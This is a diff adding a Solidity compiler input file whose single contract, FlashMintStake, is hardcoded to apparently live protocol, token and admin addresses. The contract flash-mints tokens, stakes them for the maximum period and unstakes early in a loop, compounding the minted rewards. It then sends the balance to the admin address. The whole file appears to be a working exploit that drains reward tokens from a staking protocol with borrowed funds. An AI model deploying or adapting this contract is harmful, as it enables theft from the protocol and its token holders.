@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "browser/contracts/FlashMintStake.sol": {
+      "content": "interface IFlashProtocol {\n    enum LockedFunctions { SET_MATCH_RATIO, SET_MATCH_RECEIVER }\n\n    function TIMELOCK() external view returns (uint256);\n\n    function FLASH_TOKEN() external view returns (address);\n\n    function matchRatio() external view returns (uint256);\n\n    function matchReceiver() external view returns (address);\n\n    function stakes(bytes32 _id)\n        external\n        view\n        returns (\n            uint256 amountIn,\n            uint256 expiry,\n            uint256 expireAfter,\n            uint256 mintedAmount,\n            address staker,\n            address receiver\n        );\n\n    function stake(\n        uint256 _amountIn,\n        uint256 _days,\n        address _receiver,\n        bytes calldata _data\n    )\n        external\n        returns (\n            uint256 mintedAmount,\n            uint256 matchedAmount,\n            bytes32 id\n        );\n\n    function lockFunction(LockedFunctions _lockedFunction) external;\n\n    function unlockFunction(LockedFunctions _lockedFunction) external;\n\n    function timelock(LockedFunctions _lockedFunction) external view returns (uint256);\n\n    function balances(address _staker) external view returns (uint256);\n\n    function unstake(bytes32 _id) external returns (uint256 withdrawAmount);\n\n    function unstakeEarly(bytes32 _id) external returns (uint256 withdrawAmount);\n\n    function getFPY(uint256 _amountIn) external view returns (uint256);\n\n    function setMatchReceiver(address _newMatchReceiver) external;\n\n    function setMatchRatio(uint256 _newMatchRatio) external;\n\n    function getMatchedAmount(uint256 mintedAmount) external view returns (uint256);\n\n    function getMintAmount(uint256 _amountIn, uint256 _expiry) external view returns (uint256);\n\n    function getPercentageStaked(uint256 _amountIn) external view returns (uint256 percentage);\n\n    function getInvFPY(uint256 _amount) external view returns (uint256);\n\n    function getPercentageUnStaked(uint256 _amount) external view returns (uint256 percentage);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function flashMint(uint256 value, bytes calldata data) external;\n}\n\ncontract FlashMintStake {\n    \n    uint256 private constant MAX_FPY_FOR_1_YEAR = 5e17;\n    uint256 private constant SECONDS_IN_1_YEAR = 31536000;\n    IFlashProtocol private constant flashProtocol = IFlashProtocol(0xEc02f813404656E2A2AEd5BaeEd41D785324E8D0);\n    IERC20 private constant flashToken = IERC20(0xB4467E8D621105312a914F1D42f10770C0Ffe3c8);\n    address private constant admin = 0x47919349261c0Be07451024313fc6C56203545fc;\n    // IFlashProtocol private constant flashProtocol = IFlashProtocol(0xd9145CCE52D386f254917e481eB44e9943F39138);\n    // IERC20 private constant flashToken = IERC20(0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8);\n    // address private constant admin = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;\n    \n    function executeOnFlashMint(bytes calldata data) external {\n        (uint256 amount, uint256 iterations) = abi.decode(data, (uint256, uint256));\n        // uint256 amount = 20000000000000000000000;\n        uint256 stakePeriod = calculateMaxStakePeriod(amount);\n        (uint256 minted, uint256 matched, bytes32 id) = flashProtocol.stake(amount, stakePeriod, address(this), data);\n        uint256 withdrawAmount = flashProtocol.unstakeEarly(id);\n       \n        for(uint256 i = 0; i < iterations; i++) {\n            amount = withdrawAmount + minted;\n            stakePeriod = calculateMaxStakePeriod(amount);\n            (minted, matched, id) = flashProtocol.stake(amount, stakePeriod, address(this), data);\n            withdrawAmount = flashProtocol.unstakeEarly(id);  \n        }\n    }\n    \n    function flashMint(uint256 amount, uint256 iterations) external {\n        flashToken.flashMint(amount, abi.encode(amount, iterations));\n    }\n    \n    function approve() external {\n        flashToken.approve(address(flashProtocol), type(uint256).max);\n    }\n    \n   function calculateMaxStakePeriod(uint256 _amountIn) public view returns (uint256) {\n        return (MAX_FPY_FOR_1_YEAR*SECONDS_IN_1_YEAR)/flashProtocol.getFPY(_amountIn);\n    }\n    \n    function withdraw() external {\n        flashToken.transfer(admin, flashToken.balanceOf(address(this)));\n    }\n    \n    function receiveFlash(\n        bytes32 id,\n        uint256 amountIn,\n        uint256 expireAfter,\n        uint256 mintedAmount,\n        address staker,\n        bytes calldata data\n    ) external returns (uint256) {\n        \n    }\n}"
+    }
+  }
+}
